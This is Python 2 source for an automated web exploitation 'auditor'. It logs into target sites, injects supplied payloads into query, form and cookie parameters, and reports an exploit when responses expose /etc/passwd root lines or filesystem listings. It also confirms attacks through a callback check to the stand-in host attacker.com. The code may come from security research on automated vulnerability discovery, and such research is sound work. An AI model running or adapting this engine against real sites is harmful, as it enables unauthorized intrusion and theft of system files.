from pipe import JSONPipe
import requests
import re
import os
import json
from urlparse import urlparse
from urlparse import parse_qsl
import lxml.html


def domain(url):
    url = re.sub('http(s?)://', '', url)
    return url[:url.find('/')]


def parse_token(url, keys):
    o = urlparse(url)
    params = parse_qsl(o.query)

    token = {}

    for key, value in params:
        if key in keys:
            token[key] = value

    return token


def prepare_bundles(params, payload):
    keys = params.keys()
    bundles = []

    if len(payload) == 1:
        for key in keys:
            bundle = params.copy()
            bundle[key] = payload[0]
            bundles.append(bundle)

        bundles.append(fill(params.copy(), payload[0]))

    elif len(payload) == 2:
        if len(keys) == 1:
            bundles.append({keys[0]: "".join(payload)})

        for i in range(0, len(keys)):
            ka = keys[i]
            for j in range(i + 1, len(keys)):
                kb = keys[j]

                bundle = params.copy()
                bundle[ka] = payload[0]
                bundle[kb] = payload[1]
                bundle = fill(bundle, payload[1])
                bundles.append(bundle)

                bundle = params.copy()
                bundle[kb] = payload[0]
                bundle[ka] = payload[1]
                bundle = fill(bundle, payload[1])
                bundles.append(bundle)

    return bundles


def fill(bundle, value):
    for k in bundle:
        if bundle[k] == "":
            bundle[k] = value

    return bundle


class auditor(JSONPipe):
    """Inject payloads to each endpoint and check if there is any vulnerability.
    """

    def __init__(self, seeds):
        self.verificationPattern = re.compile('root:(.*):0:0')
        self.linkPattern = re.compile('(href|src)="?([^\">]*)"?')
        self.filePath = 'data/image.jpg'
        self.http = requests.Session()

        # pairs of : domain - already logged in?
        self.session = {}
        self.seeds = json.load(open(seeds, 'r'))
        pass

    def process(self, incomings):
        """Do the injection here.

        `incomings[0]` is a list of injection endpoints
        `incomings[1]` is a list of payloads
        """

        # Exploits to be returned
        exploits = []

        counter = 0

        for endpoint in incomings[0]:

            if 'seed' in endpoint and endpoint['seed'] >= 0:
                auth = self.login(endpoint)
            else:
                auth = None

            for payload in incomings[1]:
                exploitable, exploit = self.exploit(endpoint, payload)

                if exploitable:
                    counter += 1
                    if auth:
                        #exploit = [auth] + exploit
                        exploit = exploit
                    exploits.append({
                        'name': 'exploit-' + str(counter),
                        'exploit': exploit
                    })
                    print "found exploit, skip other payload"
                    break

        for exploit in exploits:
            for ex in exploit['exploit']:
                if 'cookies' not in ex:
                    ex['cookies'] = None
                if ex['fileFields']:
                    for k in ex['fileFields']:
                        ex['formFields'][k] = ex['fileFields'][k]

        return exploits

    def login(self, endpoint):

        seed = endpoint['seed']

        if seed not in self.session:
            self.session[seed] = {
                "login": False,
                "token": None,
            }
        else:
            return

        params = self.seeds[seed]['auth']['params'].copy()
        auth = self.seeds[seed]['auth']

        if auth:
            page = self.http.get(auth['url'], verify=False)
            html = lxml.html.document_fromstring(str(page.text))
            inputs = html.xpath("//input[@type='hidden']")
            if 'grabs' in auth:
                for field in inputs:
                    if field.name in auth['grabs']:
                        auth['params'][field.name] = field.value

            r = self.http.post(auth['target'], data=auth['params'], verify=False)

            if 'token' in auth:
                self.session[seed]['token'] = parse_token(r.request.url, auth['token'])
            self.session[seed]['login'] = True

            return {
                'url': auth['url'],
                'formFields': params,
                'fileFields': None
            }

    def exploit(self, endpoint, payload):
        exploit = []

        session = None
        if 'seed' in endpoint and endpoint['seed'] >= 0:
            session = self.session[endpoint['seed']]

        method = endpoint['method'].upper()
        target = endpoint['target']
        params = endpoint['params']

        entrance = endpoint['url'] if 'url' in endpoint else endpoint['target']

        files = {}
        file_fields = {}

        for key in params:
            if endpoint['files'] and key in endpoint['files']:
                files[key] = open(self.filePath, 'rb')

        if session and 'token' in session and session['token']:
            if entrance == target:
                for k in session['token']:
                    entrance += "&" + k + "=" + session['token'][k]
            for k in session['token']:
                target += "&" + k + "=" + session['token'][k]
        print method, ": ", target

        if files:
            for k in files:
                file_fields[k] = os.path.abspath(files[k].name)

        bundles = prepare_bundles(params, payload)

        found = False

        for bundle in bundles:
            for key in params:
                if endpoint['files'] and key in endpoint['files']:
                    bundle.pop(key, None)

            print "attempting:", bundle, file_fields

            if method == 'GET':
                r = self.http.get(target, params=bundle, verify=False)
            elif method == 'COOKIE':
                r = self.http.get(target, cookies=bundle, verify=False)
            else:
                r = self.http.post(target, data=bundle, files=files, verify=False)

            exploitable, exp = self.verify(r, target)

            if exploitable:
                found = True
                break

        #cookies = requests.utils.dict_from_cookiejar(self.http.cookies)
        cookies = self.http.cookies.get_dict(domain(target))

        if found:
            if method == 'GET':
                query = ''
                for k in bundle:
                    query += "%s=%s&" % (k, bundle[k])
                exploit.append({
                    'url': target + "?" + query,
                    'cookies': cookies,
                    'formFields': None,
                    'fileFields': None
                })
            elif method == 'COOKIE':
                exploit.append({
                    'url': target,
                    'cookies': cookies,
                    'formFields': None,
                    'fileFields': None
                })
            elif method == 'POST':
                exploit.append({
                    'url': entrance,
                    'cookies': cookies,
                    'formFields': bundle,
                    'fileFields': file_fields
                })
            # Ignore COOKIE for now
            else:
                return False, []

        print 'exploitable: ', exploitable

        return exploitable, exploit + exp

    def verify(self, response, referer):

        exploit = []

        if self.see_root(response.text):
            return True, exploit
        else:
            r = self.http.get("http://attacker.com/check.php")
            link = r.text
            if not r.text == 'CLEAN':
                exploit.append({
                    'url': link,
                    'formFields': None,
                    'fileFields': None
                })
                self.http.get("http://attacker.com/check.php?clean=true")
                return True, exploit
            """
            links = self.find_links(response.text, referer)

            for link in links:
                if re.search('logout', link):
                    print "Skip: ", link
                    continue
                r = self.http.get(link, verify=False)
                if self.see_root(r.text):
                    exploit.append({
                        'url': link,
                        'formFields': None
                    })
                    return True, exploit
            """

        return False, exploit

    def see_root(self, text):
        passwd = self.verificationPattern.search(re.sub('<[^>]*>', '', text))
        rootlist = re.search('\/lost\+found', text)
        initrdimg = re.search('initrd\.img', text)

        return passwd or rootlist or initrdimg

    def find_links(self, text, referer=''):
        links = []
        base = referer[:referer.rfind('/')]
        for match in self.linkPattern.finditer(text):
            uri = match.group(2)

            if uri[:7] == 'http://' or uri[:8] == 'https://':
                links.append(uri)
            else:
                links.append(base + '/' + uri)

        return links
